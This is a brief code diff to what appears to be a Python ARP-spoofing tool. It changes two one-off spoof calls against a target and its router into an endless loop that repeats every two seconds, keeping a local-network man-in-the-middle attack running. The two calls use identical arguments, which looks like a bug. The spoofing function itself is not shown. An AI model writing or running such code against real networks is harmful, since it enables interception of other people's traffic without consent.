@@ -27,5 +27,7 @@ def spoof(targetIp, spoofIp):
 
 opt = getArgs()
 
-spoof(opt.targetIp, opt.routerIp)
-spoof(opt.targetIp, opt.routerIp)
+while True:
+    spoof(opt.targetIp, opt.routerIp)
+    spoof(opt.targetIp, opt.routerIp)
+    time.sleep(2)
